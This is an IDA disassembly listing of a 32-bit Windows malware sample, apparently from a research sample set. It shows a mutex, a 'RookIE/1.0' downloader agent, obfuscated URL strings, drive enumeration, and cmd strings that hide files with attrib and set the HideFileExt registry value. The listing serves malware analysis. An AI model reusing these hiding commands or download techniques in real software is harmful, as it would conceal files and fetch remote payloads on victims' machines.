;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	00E2517956235938E99A6C4DA5E8AE8C
; Input	CRC32 :	AD51259B

; File Name   :	c:\Users\farhadi\Desktop\Sample\samples\00e2517956235938e99a6c4da5e8ae8c
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 000001F9 (	505.)
; Section size in file		: 00001000 (   4096.)
; Offset to raw	data for section: 00001000
; Flags	60000020: Text Executable Readable
; Alignment	: default
; OS type	  :  MS	Windows
; Application type:  Executable	32bit

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
PAGE		segment	para public 'CODE' use32
		assume cs:PAGE
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_401000(HWND	hWnd, UINT Msg,	WPARAM wParam, LPARAM lParam)
sub_401000	proc near		; DATA XREF: sub_4010F0+21o

Paint		= tagPAINTSTRUCT ptr -44h
var_4		= dword	ptr -4
hWnd		= dword	ptr  4
Msg		= dword	ptr  8
wParam		= dword	ptr  0Ch
lParam		= dword	ptr  10h

		sub	esp, 44h
		mov	eax, ___security_cookie
		mov	ecx, [esp+44h+Msg]
		mov	[esp+44h+var_4], eax
		mov	eax, ecx
		sub	eax, 2
		jz	loc_4010CB
		sub	eax, 0Dh
		jz	short loc_40109C
		sub	eax, 102h
		jz	short loc_40104C
		mov	eax, [esp+44h+lParam]
		mov	edx, [esp+44h+wParam]
		push	eax		; lParam
		mov	eax, [esp+48h+hWnd]
		push	edx		; wParam
		push	ecx		; Msg
		push	eax		; hWnd
		call	ds:DefWindowProcA
		mov	ecx, [esp+44h+var_4]
		call	sub_403A50
		add	esp, 44h
		retn	10h
; ---------------------------------------------------------------------------

loc_40104C:				; CODE XREF: sub_401000+25j
		mov	ecx, [esp+44h+wParam]
		movzx	eax, cx
		sub	eax, 68h
		jz	short loc_4010D3
		dec	eax
		jz	short loc_401080
		mov	edx, [esp+44h+lParam]
		mov	eax, [esp+44h+hWnd]
		push	edx		; lParam
		push	ecx		; wParam
		push	111h		; Msg
		push	eax		; hWnd
		call	ds:DefWindowProcA
		mov	ecx, [esp+44h+var_4]
		call	sub_403A50
		add	esp, 44h
		retn	10h
; ---------------------------------------------------------------------------

loc_401080:				; CODE XREF: sub_401000+59j
		mov	ecx, [esp+44h+hWnd]
		push	ecx		; hWnd
		call	ds:DestroyWindow
		xor	eax, eax
		mov	ecx, [esp+44h+var_4]
		call	sub_403A50
		add	esp, 44h
		retn	10h
; ---------------------------------------------------------------------------

loc_40109C:				; CODE XREF: sub_401000+1Ej
		push	esi
		mov	esi, [esp+48h+hWnd]
		lea	edx, [esp+48h+Paint]
		push	edx		; lpPaint
		push	esi		; hWnd
		call	ds:BeginPaint
		lea	eax, [esp+48h+Paint]
		push	eax		; lpPaint
		push	esi		; hWnd
		call	ds:EndPaint
		pop	esi
		xor	eax, eax
		mov	ecx, [esp+44h+var_4]
		call	sub_403A50
		add	esp, 44h
		retn	10h
; ---------------------------------------------------------------------------

loc_4010CB:				; CODE XREF: sub_401000+15j
		push	0		; nExitCode
		call	ds:PostQuitMessage

loc_4010D3:				; CODE XREF: sub_401000+56j
		mov	ecx, [esp+44h+var_4]
		xor	eax, eax
		call	sub_403A50
		add	esp, 44h
		retn	10h
sub_401000	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_4010F0(HINSTANCE hInstance)
sub_4010F0	proc near		; CODE XREF: WinMain(x,x,x,x)+52p

var_30		= WNDCLASSEXA ptr -30h
hInstance	= dword	ptr  4

		sub	esp, 30h
		mov	eax, [esp+30h+hInstance]
		push	esi
		mov	esi, ds:LoadIconA
		push	6Bh		; lpIconName
		push	eax		; hInstance
		mov	[esp+3Ch+var_30.cbSize], 30h
		mov	[esp+3Ch+var_30.style],	3
		mov	[esp+3Ch+var_30.lpfnWndProc], offset sub_401000
		mov	[esp+3Ch+var_30.cbClsExtra], 0
		mov	[esp+3Ch+var_30.cbWndExtra], 0
		mov	[esp+3Ch+var_30.hInstance], eax
		call	esi ; LoadIconA
		push	7F00h		; lpCursorName
		push	0		; hInstance
		mov	[esp+3Ch+var_30.hIcon],	eax
		call	ds:LoadCursorA
		mov	[esp+34h+var_30.hCursor], eax
		mov	eax, [esp+34h+var_30.hInstance]
		push	6Ch		; lpIconName
		push	eax		; hInstance
		mov	[esp+3Ch+var_30.hbrBackground],	6
		mov	[esp+3Ch+var_30.lpszMenuName], 0
		mov	[esp+3Ch+var_30.lpszClassName],	offset byte_4055B8
		call	esi ; LoadIconA
		lea	ecx, [esp+34h+var_30]
		push	ecx		; WNDCLASSEXA *
		mov	[esp+38h+var_30.hIconSm], eax
		call	ds:RegisterClassExA
		pop	esi
		add	esp, 30h
		retn
sub_4010F0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
_WinMain@16	proc near		; CODE XREF: start+180p

hInstance	= dword	ptr  4
hPrevInstance	= dword	ptr  8
lpCmdLine	= dword	ptr  0Ch
nShowCmd	= dword	ptr  10h

		push	offset Name	; "saft_01"
		push	0		; bInitialOwner
		push	0		; lpMutexAttributes
		call	ds:CreateMutexA
		call	ds:GetLastError
		cmp	eax, 0B7h
		jnz	short loc_4011A9
		call	sub_403710
		mov	eax, 1
		retn	10h
; ---------------------------------------------------------------------------

loc_4011A9:				; CODE XREF: WinMain(x,x,x,x)+1Aj
		push	edi
		call	sub_403930
		mov	esi, [esp+4+hInstance]
		mov	edi, ds:LoadStringA
		push	64h		; cchBufferMax
		push	offset Buffer	; lpBuffer
		push	67h		; uID
		push	esi		; hInstance
		call	edi ; LoadStringA
		push	64h		; cchBufferMax
		push	offset byte_4055B8 ; lpBuffer
		push	6Dh		; uID
		push	esi		; hInstance
		call	edi ; LoadStringA
		push	esi		; hInstance
		call	sub_4010F0
		add	esp, 4
		push	6Dh		; lpTableName
		push	esi		; hInstance
		call	ds:LoadAcceleratorsA
		mov	esi, ds:Sleep
		pop	edi
		lea	ebx, [ebx+0]

loc_4011F0:				; CODE XREF: WinMain(x,x,x,x)+77j
		push	186A0h		; dwMilliseconds
		call	esi ; Sleep
		jmp	short loc_4011F0
_WinMain@16	endp

; ---------------------------------------------------------------------------
		align 1000h
PAGE		ends

; Section 2. (virtual address 00002000)
; Virtual size			: 000009CE (   2510.)
; Section size in file		: 00001000 (   4096.)
; Offset to raw	data for section: 00002000
; Flags	40000040: Data Readable
; Alignment	: default
;
; Imports from KERNEL32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
; HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA	lpFindFileData)
		extrn FindFirstFileA:dword ; DATA XREF:	.rdata:004023F8o
; void __stdcall GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime)
		extrn GetSystemTimeAsFileTime:dword ; CODE XREF: .data:00403CF4p
					; DATA XREF: .data:00403CF4r
; DWORD	__stdcall GetCurrentProcessId()
		extrn GetCurrentProcessId:dword	; CODE XREF: .data:00403D00p
					; DATA XREF: .data:00403D00r
; DWORD	__stdcall GetCurrentThreadId()
		extrn GetCurrentThreadId:dword ; CODE XREF: .data:00403D08p
					; DATA XREF: .data:00403D08r
; DWORD	__stdcall GetTickCount()
		extrn GetTickCount:dword ; CODE	XREF: .data:00403D10p
					; DATA XREF: .data:00403D10r
; BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount)
		extrn QueryPerformanceCounter:dword ; CODE XREF: .data:00403D1Cp
					; DATA XREF: .data:00403D1Cr
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA	lpStartupInfo)
		extrn GetStartupInfoA:dword ; CODE XREF: start+164p
					; DATA XREF: start+164r
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; CODE XREF: start+18p start+17Dp
					; DATA XREF: ...
; void __stdcall ExitProcess(UINT uExitCode)
		extrn ExitProcess:dword	; CODE XREF: sub_403A1F+2Ap
					; DATA XREF: sub_403A1F+2Ar
; HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName)
		extrn CreateMutexA:dword ; CODE	XREF: WinMain(x,x,x,x)+9p
					; DATA XREF: WinMain(x,x,x,x)+9r
; DWORD	__stdcall GetLastError()
		extrn GetLastError:dword ; CODE	XREF: WinMain(x,x,x,x)+Fp
					; DATA XREF: WinMain(x,x,x,x)+Fr
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags,	LPDWORD	lpThreadId)
		extrn CreateThread:dword ; CODE	XREF: sub_403930+5Dp
					; DATA XREF: sub_403930+5Dr
; void __stdcall Sleep(DWORD dwMilliseconds)
		extrn Sleep:dword	; CODE XREF: WinMain(x,x,x,x)+75p
					; DATA XREF: WinMain(x,x,x,x)+63r
; DWORD	__stdcall GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer)
		extrn GetCurrentDirectoryA:dword ; CODE	XREF: sub_403710+Bp
					; DATA XREF: sub_403710+Br
; DWORD	__stdcall GetLogicalDriveStringsA(DWORD	nBufferLength, LPSTR lpBuffer)
		extrn GetLogicalDriveStringsA:dword
; UINT __stdcall GetDriveTypeA(LPCSTR lpRootPathName)
		extrn GetDriveTypeA:dword
; BOOL __stdcall FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
		extrn FindNextFileA:dword
; BOOL __stdcall FindClose(HANDLE hFindFile)
		extrn FindClose:dword
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule, LPCH lpFilename, DWORD nSize)
		extrn GetModuleFileNameA:dword ; CODE XREF: sub_403710+1Dp
					; DATA XREF: sub_403710+1Dr
; BOOL __stdcall DeleteFileA(LPCSTR lpFileName)
		extrn DeleteFileA:dword
; UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize)
		extrn GetSystemDirectoryA:dword	; CODE XREF: sub_403280+25p
					; DATA XREF: sub_403280+25r
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn CloseHandle:dword	; CODE XREF: sub_403930+64p
					; DATA XREF: sub_403930+64r

;
; Imports from MSVCR71.dll
;
		extrn __imp___dllonexit:dword ;	DATA XREF: .rdata:004023E4o
					; __dllonexitr
; unsigned int __cdecl _controlfp(unsigned int NewValue, unsigned int Mask)
		extrn __imp__controlfp:dword ; DATA XREF: _controlfpr
		extrn __set_app_type:dword ; CODE XREF:	start+71p
					; DATA XREF: start+71r
		extrn __p__fmode:dword	; CODE XREF: start+86p
					; DATA XREF: start+86r
		extrn __p__commode:dword ; CODE	XREF: start+94p
					; DATA XREF: start+94r
		extrn _adjust_fdiv:dword ; DATA	XREF: start+A2r
		extrn __setusermatherr:dword ; CODE XREF: start+C5p
					; DATA XREF: start+C5r
		extrn __imp__initterm:dword ; DATA XREF: _inittermr
		extrn __getmainargs:dword ; CODE XREF: start+108p
					; DATA XREF: start+108r
		extrn __imp__amsg_exit:dword ; DATA XREF: _amsg_exitr
; int sprintf(char *Dest, const	char *Format, ...)
		extrn __imp_sprintf:dword ; DATA XREF: sprintfr
		extrn _acmdln:dword	; DATA XREF: start+131r
; void __cdecl exit(int	Code)
		extrn exit:dword	; CODE XREF: start+190p
					; DATA XREF: start+190r
; void __cdecl cexit()
		extrn _cexit:dword	; CODE XREF: start:loc_403C70p
					; DATA XREF: start:loc_403C70r
; int __cdecl ismbblead(unsigned int)
		extrn _ismbblead:dword	; CODE XREF: start+1B1p
					; DATA XREF: start+1B1r
		extrn _XcptFilter:dword
; void __cdecl exit(int	Code)
		extrn _exit:dword
; void __cdecl c_exit()
		extrn _c_exit:dword
		extrn _except_handler3:dword
		extrn __imp___security_error_handler:dword
					; DATA XREF: __security_error_handlerr
; int fscanf(FILE *File, const char *Format, ...)
		extrn __imp_fscanf:dword ; DATA	XREF: fscanfr
; char *__cdecl	strstr(const char *Str,	const char *SubStr)
		extrn __imp_strstr:dword ; DATA	XREF: strstrr
; int __cdecl fseek(FILE *File,	__int32	Offset,	int Origin)
		extrn __imp_fseek:dword	; DATA XREF: fseekr
; size_t __cdecl fread(void *DstBuf, size_t ElementSize, size_t	Count, FILE *File)
		extrn fread:dword	; DATA XREF: .data:00403A78o
; FILE *__cdecl	fopen(const char *Filename, const char *Mode)
		extrn __imp_fopen:dword	; DATA XREF: fopenr
; size_t __cdecl fwrite(const void *Str, size_t	Size, size_t Count, FILE *File)
		extrn __imp_fwrite:dword ; DATA	XREF: fwriter
; int __cdecl fclose(FILE *File)
		extrn __imp_fclose:dword ; DATA	XREF: fcloser
; _onexit_t __cdecl onexit(_onexit_t Func)
		extrn _onexit:dword	; DATA XREF: sub_403DA6+9r

;
; Imports from NETAPI32.dll
;
; UCHAR	__stdcall Netbios(PNCB pncb)
		extrn __imp_Netbios:dword ; DATA XREF: .rdata:00402434o
					; Netbiosr

;
; Imports from SHELL32.dll
;
; HINSTANCE __stdcall ShellExecuteA(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd)
		extrn ShellExecuteA:dword ; CODE XREF: sub_403710+ACp
					; sub_403860+3Ap ...

;
; Imports from USER32.dll
;
; ATOM __stdcall RegisterClassExA(const	WNDCLASSEXA *)
		extrn RegisterClassExA:dword ; CODE XREF: sub_4010F0+7Ep
					; DATA XREF: sub_4010F0+7Er ...
; HCURSOR __stdcall LoadCursorA(HINSTANCE hInstance, LPCSTR lpCursorName)
		extrn LoadCursorA:dword	; CODE XREF: sub_4010F0+4Ap
					; DATA XREF: sub_4010F0+4Ar
; BOOL __stdcall DestroyWindow(HWND hWnd)
		extrn DestroyWindow:dword ; CODE XREF: sub_401000+85p
					; DATA XREF: sub_401000+85r
; HACCEL __stdcall LoadAcceleratorsA(HINSTANCE hInstance, LPCSTR lpTableName)
		extrn LoadAcceleratorsA:dword ;	CODE XREF: WinMain(x,x,x,x)+5Dp
					; DATA XREF: WinMain(x,x,x,x)+5Dr
; int __stdcall	LoadStringA(HINSTANCE hInstance, UINT uID, LPSTR lpBuffer, int cchBufferMax)
		extrn LoadStringA:dword	; CODE XREF: WinMain(x,x,x,x)+43p
					; WinMain(x,x,x,x)+4Fp
					; DATA XREF: ...
; BOOL __stdcall EndPaint(HWND hWnd, const PAINTSTRUCT *lpPaint)
		extrn EndPaint:dword	; CODE XREF: sub_401000+B3p
					; DATA XREF: sub_401000+B3r
; LRESULT __stdcall DefWindowProcA(HWND	hWnd, UINT Msg,	WPARAM wParam, LPARAM lParam)
		extrn DefWindowProcA:dword ; CODE XREF:	sub_401000+37p
					; sub_401000+6Bp
					; DATA XREF: ...
; HDC __stdcall	BeginPaint(HWND	hWnd, LPPAINTSTRUCT lpPaint)
		extrn BeginPaint:dword	; CODE XREF: sub_401000+A7p
					; DATA XREF: sub_401000+A7r
; HICON	__stdcall LoadIconA(HINSTANCE hInstance, LPCSTR	lpIconName)
		extrn LoadIconA:dword	; CODE XREF: sub_4010F0+3Dp
					; sub_4010F0+73p
					; DATA XREF: ...
; void __stdcall PostQuitMessage(int nExitCode)
		extrn PostQuitMessage:dword ; CODE XREF: sub_401000+CDp
					; DATA XREF: sub_401000+CDr

;
; Imports from WININET.dll
;
; BOOL __stdcall InternetCloseHandle(HINTERNET hInternet)
		extrn InternetCloseHandle:dword	; CODE XREF: sub_403200+6Ap
					; sub_403200+6Ep ...
; HINTERNET __stdcall InternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders,	DWORD dwHeadersLength, DWORD dwFlags, DWORD dwContext)
		extrn InternetOpenUrlA:dword ; CODE XREF: sub_403200+2Dp
					; sub_403280+DCp
					; DATA XREF: ...
; HINTERNET __stdcall InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
		extrn InternetOpenA:dword ; CODE XREF: sub_403200+Ep
					; sub_403280+BFp
					; DATA XREF: ...
; BOOL __stdcall InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
		extrn InternetReadFile:dword ; CODE XREF: sub_403200+63p
					; sub_403280+125p
					; DATA XREF: ...


; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 402120h
		dd 0
aM		db 9,'¹ÆM',0
		align 4
		dd 2, 40h, 2 dup(2378h)
; char Format[]
Format		db '%02X-%02X-%02X-%02X-%02X-%02X',0 ; DATA XREF: sub_403040+115o
		align 4
; char aS[]
aS		db '%s',0               ; DATA XREF: sub_403710+4Do
					; sub_4037F0+7o
		align 10h
; char aS?macS[]
aS?macS		db '%s?mac=%s',0        ; DATA XREF: sub_403180+36o
		align 4
unk_40216C	db  69h	; i		; DATA XREF: sub_403180+13o
		db 2 dup(7Dh), 71h
		db  3Bh	; ;
		db 2 dup(30h), 6Dh
		db  75h	; u
		db 75h,	37h, 72h
		db  7Fh	; 
aPmNQ77ub222100	db 'pm|n}~q7||7ub;22210<0lulp~w}0lp~w}7b|q',0
; char szAgent[]
szAgent		db 'RookIE/1.0',0       ; DATA XREF: sub_403200+9o
					; sub_403280+BAo
		align 4
; char Mode[]
Mode		db 'wb',0               ; DATA XREF: sub_403280+E8o
		align 10h
; char aSS_0[]
aSS_0		db '%s\%s',0            ; DATA XREF: sub_403280+A4o
		align 4
; char aCmd[]
aCmd		db 'cmd',0              ; DATA XREF: sub_403930+33o
aWB		db 'w+b',0
; char aRb[3]
aRb		db 'rb',0               ; DATA XREF: sub_403710+23o
		align 4
aS_exe		db '%s.exe',0
		align 4
aCAttribSAHRSS	db '/c attrib +s +a +h +r "%s\%s"',0
		align 4
aSystemVolumeIn	db 'System Volume Information',0
		align 4
aS_		db '%s*.*',0
		align 10h
; char File[]
File		db 'explorer',0         ; DATA XREF: sub_403710+A3o
		align 4
; char aSS[]
aSS		db '%s"%s"',0           ; DATA XREF: sub_403710+88o
		align 4
; char SubStr[]
SubStr		db 'yes',0              ; DATA XREF: sub_403930+B1o
aIQ00xxx7xl9?_0	db 'i}}q;00xxx7xl9?7lpv0lqb7sbs',0 ; DATA XREF: sub_403930+74o
					; sub_403930+93o ...
aIQ00xxx7xl9?7l	db 'i}}q;00xxx7xl9?7lpv0uphp7hjo',0 ; DATA XREF: sub_403930+6Ao
		align 8
aCRegAddHkcuSof	db '/c reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explor'
					; DATA XREF: sub_403930+18o
		db 'er\Advanced" /v HideFileExt /t reg_dword /d 00000001 /f ',0
		align 4
; char Name[]
Name		db 'saft_01',0          ; DATA XREF: WinMain(x,x,x,x)o
		align 10h
dword_4022F0	dd 0FFFFFFFFh, 403A3Ch,	403A40h, 0 ; DATA XREF:	sub_403A1F+2o
dword_402300	dd 0FFFFFFFFh, 403CA0h,	403CB4h, 0 ; DATA XREF:	start+2o
dword_402310	dd 0FFFFFFFFh, 403E0Bh,	403E0Fh, 0 ; DATA XREF:	sub_403DDE+2o
		dd 0FFFFFFFFh, 403E4Fh,	403E53h, 0
__load_config_used dd 48h		; Size
		dd 0			; Time stamp
		dw 2 dup(0)		; Version: 0.0
		dd 0			; GlobalFlagsClear
		dd 0			; GlobalFlagsSet
		dd 0			; CriticalSectionDefaultTimeout
		dd 0			; DeCommitFreeBlockThreshold
		dd 0			; DeCommitTotalFreeThreshold
		dd 0			; LockPrefixTable
		dd 0			; MaximumAllocationSize
		dd 0			; VirtualMemoryThreshold
		dd 0			; ProcessAffinityMask
		dd 0			; ProcessHeapFlags
		dw 0			; CSDVersion
		dw 0			; Reserved1
		dd 0			; EditList
		dd offset ___security_cookie ; SecurityCookie
		dd offset ___safe_se_handler_table ; SEHandlerTable
		dd 1			; SEHandlerCount
		db  52h	; R
		db 53h,	44h, 53h
		db  59h	; Y
		db 0C6h, 0E5h, 71h
		db  1Ch
		db 15h,	0A8h, 4Eh
		db  93h	; “
		db 9, 9Ah, 3Eh
		db  71h	; q
		db 26h,	46h, 8
		db    1
		align 10h
aEFGcabCdqcqufG	db 'e:\ä»£ç \æ„ŸæŸ“ä»£ç \Release\safe.pdb',0
		align 10h
___safe_se_handler_table dd rva	dword_403D94 ; DATA XREF: .rdata:00402370o
		align 8
dword_4023C8	dd 3 dup(0)		; DATA XREF: sub_403DDE+Co
					; sub_403DDE:loc_403DF1o
__IMPORT_DESCRIPTOR_MSVCR71 dd rva off_4024BC ;	Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aMsvcr71_dll	; DLL Name
		dd rva __imp___dllonexit ; Import Address Table
__IMPORT_DESCRIPTOR_KERNEL32 dd	rva off_402460 ; Import	Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aKernel32_dll	; DLL Name
		dd rva FindFirstFileA	; Import Address Table
__IMPORT_DESCRIPTOR_USER32 dd rva off_402540 ; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aUser32_dll	; DLL Name
		dd rva RegisterClassExA	; Import Address Table
__IMPORT_DESCRIPTOR_SHELL32 dd rva off_402538 ;	Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aShell32_dll	; DLL Name
		dd rva ShellExecuteA	; Import Address Table
__IMPORT_DESCRIPTOR_NETAPI32 dd	rva off_402530 ; Import	Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aNetapi32_dll	; DLL Name
		dd rva __imp_Netbios	; Import Address Table
__IMPORT_DESCRIPTOR_WININET dd rva off_40256C ;	Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aWininet_dll	; DLL Name
		dd rva InternetCloseHandle ; Import Address Table
		dd 5 dup(0)
;
; Import names for KERNEL32.dll
;
off_402460	dd rva word_402726	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_KERNEL32o
		dd rva word_40286E
		dd rva word_402858
		dd rva word_402842
		dd rva word_402832
		dd rva word_402818
		dd rva word_402806
		dd rva word_4027F2
		dd rva word_4027E4
		dd rva word_4027D4
		dd rva word_4027C4
		dd rva word_4027B4
		dd rva word_4027AC
		dd rva word_402794
		dd rva word_40277A
		dd rva word_40276A
		dd rva word_40275A
		dd rva word_40274E
		dd rva word_402738
		dd rva word_402718
		dd rva word_402702
		dd rva word_4026F4
		dd 0
;
; Import names for MSVCR71.dll
;
off_4024BC	dd rva word_4026CE	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_MSVCR71o
		dd rva word_4026E6
		dd rva word_4026BC
		dd rva word_4026AE
		dd rva word_40269E
		dd rva word_40268E
		dd rva word_40267A
		dd rva word_40266E
		dd rva word_40265E
		dd rva word_402650
		dd rva word_402580
		dd rva word_402646
		dd rva word_40263E
		dd rva word_402634
		dd rva word_402626
		dd rva word_402618
		dd rva word_402610
		dd rva word_402606
		dd rva word_4025E6
		dd rva word_4025CA
		dd rva word_4025C0
		dd rva word_4025B6
		dd rva word_4025AE
		dd rva word_4025A6
		dd rva word_40259E
		dd rva word_402594
		dd rva word_40258A
		dd rva word_4026DC
		dd 0
;
; Import names for NETAPI32.dll
;
off_402530	dd rva word_40295C	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_NETAPI32o
		dd 0
;
; Import names for SHELL32.dll
;
off_402538	dd rva word_402940	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_SHELL32o
		dd 0
;
; Import names for USER32.dll
;
off_402540	dd rva word_4028E4	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_USER32o
		dd rva word_4028F8
		dd rva word_4028C2
		dd rva word_402912
		dd rva word_402926
		dd rva word_4028A8
		dd rva word_4028D2
		dd rva word_4028B4
		dd rva word_402906
		dd rva word_402896
		dd 0
;
; Import names for WININET.dll
;
off_40256C	dd rva word_402988	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_WININETo
		dd rva word_40299E
		dd rva word_4029B2
		dd rva word_402974
		dd 0
word_402580	dw 300h			; DATA XREF: .rdata:004024E4o
		db 'sprintf',0
word_40258A	dw 29Ah			; DATA XREF: .rdata:00402524o
		db 'fclose',0
		align 4
word_402594	dw 2B4h			; DATA XREF: .rdata:00402520o
		db 'fwrite',0
		align 2
word_40259E	dw 2A5h			; DATA XREF: .rdata:0040251Co
		db 'fopen',0
word_4025A6	dw 2ABh			; DATA XREF: .rdata:00402518o
		db 'fread',0
word_4025AE	dw 2B0h			; DATA XREF: .rdata:00402514o
		db 'fseek',0
word_4025B6	dw 313h			; DATA XREF: .rdata:00402510o
		db 'strstr',0
		align 10h
word_4025C0	dw 2AFh			; DATA XREF: .rdata:0040250Co
		db 'fscanf',0
		align 2
word_4025CA	dw 9Bh			; DATA XREF: .rdata:00402508o
		db '__security_error_handler',0
		align 2
word_4025E6	dw 0F1h			; DATA XREF: .rdata:00402504o
		db '_except_handler3',0
		align 2
aMsvcr71_dll	db 'MSVCR71.dll',0      ; DATA XREF: .rdata:004023E0o
word_402606	dw 0CAh			; DATA XREF: .rdata:00402500o
		db '_c_exit',0
word_402610	dw 0FAh			; DATA XREF: .rdata:004024FCo
		db '_exit',0
word_402618	dw 4Bh			; DATA XREF: .rdata:004024F8o
		db '_XcptFilter',0
word_402626	dw 14Dh			; DATA XREF: .rdata:004024F4o
		db '_ismbblead',0
		align 4
word_402634	dw 0CDh			; DATA XREF: .rdata:004024F0o
		db '_cexit',0
		align 2
word_40263E	dw 297h			; DATA XREF: .rdata:004024ECo
		db 'exit',0
		align 2
word_402646	dw 0ADh			; DATA XREF: .rdata:004024E8o
		db '_acmdln',0
word_402650	dw 0C2h			; DATA XREF: .rdata:004024E0o
		db '_amsg_exit',0
		align 2
word_40265E	dw 6Eh			; DATA XREF: .rdata:004024DCo
		db '__getmainargs',0
word_40266E	dw 13Fh			; DATA XREF: .rdata:004024D8o
		db '_initterm',0
word_40267A	dw 9Fh			; DATA XREF: .rdata:004024D4o
		db '__setusermatherr',0
		align 2
word_40268E	dw 0BBh			; DATA XREF: .rdata:004024D0o
		db '_adjust_fdiv',0
		align 2
word_40269E	dw 82h			; DATA XREF: .rdata:004024CCo
		db '__p__commode',0
		align 2
word_4026AE	dw 87h			; DATA XREF: .rdata:004024C8o
		db '__p__fmode',0
		align 4
word_4026BC	dw 9Ch			; DATA XREF: .rdata:004024C4o
		db '__set_app_type',0
		align 2
word_4026CE	dw 6Bh			; DATA XREF: .rdata:off_4024BCo
		db '__dllonexit',0
word_4026DC	dw 1B8h			; DATA XREF: .rdata:00402528o
		db '_onexit',0
word_4026E6	dw 0DBh			; DATA XREF: .rdata:004024C0o
		db '_controlfp',0
		align 4
word_4026F4	dw 2Eh			; DATA XREF: .rdata:004024B4o
		db 'CloseHandle',0
word_402702	dw 1B9h			; DATA XREF: .rdata:004024B0o
		db 'GetSystemDirectoryA',0
word_402718	dw 7Ch			; DATA XREF: .rdata:004024ACo
		db 'DeleteFileA',0
word_402726	dw 0C9h			; DATA XREF: .rdata:off_402460o
		db 'FindFirstFileA',0
		align 4
word_402738	dw 175h			; DATA XREF: .rdata:004024A8o
		db 'GetModuleFileNameA',0
		align 2
word_40274E	dw 0C5h			; DATA XREF: .rdata:004024A4o
		db 'FindClose',0
word_40275A	dw 0D3h			; DATA XREF: .rdata:004024A0o
		db 'FindNextFileA',0
word_40276A	dw 14Bh			; DATA XREF: .rdata:0040249Co
		db 'GetDriveTypeA',0
word_40277A	dw 16Eh			; DATA XREF: .rdata:00402498o
		db 'GetLogicalDriveStringsA',0
word_402794	dw 138h			; DATA XREF: .rdata:00402494o
		db 'GetCurrentDirectoryA',0
		align 4
word_4027AC	dw 347h			; DATA XREF: .rdata:00402490o
		db 'Sleep',0
word_4027B4	dw 69h			; DATA XREF: .rdata:0040248Co
		db 'CreateThread',0
		align 4
word_4027C4	dw 169h			; DATA XREF: .rdata:00402488o
		db 'GetLastError',0
		align 4
word_4027D4	dw 5Ah			; DATA XREF: .rdata:00402484o
		db 'CreateMutexA',0
		align 4
word_4027E4	dw 0AFh			; DATA XREF: .rdata:00402480o
		db 'ExitProcess',0
word_4027F2	dw 177h			; DATA XREF: .rdata:0040247Co
		db 'GetModuleHandleA',0
		align 2
word_402806	dw 1AFh			; DATA XREF: .rdata:00402478o
		db 'GetStartupInfoA',0
word_402818	dw 297h			; DATA XREF: .rdata:00402474o
		db 'QueryPerformanceCounter',0
word_402832	dw 1D5h			; DATA XREF: .rdata:00402470o
		db 'GetTickCount',0
		align 2
word_402842	dw 13Eh			; DATA XREF: .rdata:0040246Co
		db 'GetCurrentThreadId',0
		align 4
